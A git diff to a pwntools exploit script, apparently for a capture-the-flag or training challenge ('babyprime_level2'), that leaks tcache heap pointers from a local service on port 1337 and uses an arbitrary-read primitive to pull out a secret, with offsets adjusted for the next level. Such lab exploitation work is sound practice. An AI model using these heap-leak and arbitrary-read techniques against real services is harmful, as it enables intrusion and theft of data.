@@ -25,10 +25,11 @@ def leak_tcache(r1, r2):
 	print(output_set)
 	for output in output_set: # checking if there's a leak like b'MESSAGE: \x00@^J\x07\x00\x00\x00' starting from '\x00'
 #		print(output[-1:])
-		if output[9:10] == b'\x01' or output[9:10] == b'\x00': # for bytes object, output[i] outputs integer
+		output = output[9:]
+		if output[:1] == b'\x00' or output[:1] == b'\x01': # for bytes object, output[i] outputs integer
 		# output[-1:] is just the very last byte
 		# output[9:10] checks the first byte
-			result = output[-8:-3]
+			result = output[:6]
 			print(result)
 			return u64(result.ljust(8, b'\x00'))
 	return 0
@@ -78,7 +79,7 @@ def arbitrary_read(r1, r2, addr, heap_base_addr):
 	
 	
 
-p = process('./babyprime_level2.0')
+p = process('./babyprime_level2.1')
 r1 = remote("localhost", 1337)
 r2 = remote("localhost", 1337)
 leak = leak_tcache(r1, r2)
@@ -94,7 +95,7 @@ if leak:
 #		print(hex(leak))
 	pause()
 	
-	secret = arbitrary_read(r1, r2, (leak << 12) + 0xf50, leak) # have to do (leak << 12) + 
+	secret = arbitrary_read(r1, r2, (leak << 12) + 0xfb0, leak) # have to do (leak << 12) + 
 	# because of operator precedence, without the () it would be evaluated as leak << (12 + 0xf50)
 	secret = secret.to_bytes(8, 'little')
 	print(f"Secret string: {secret}")
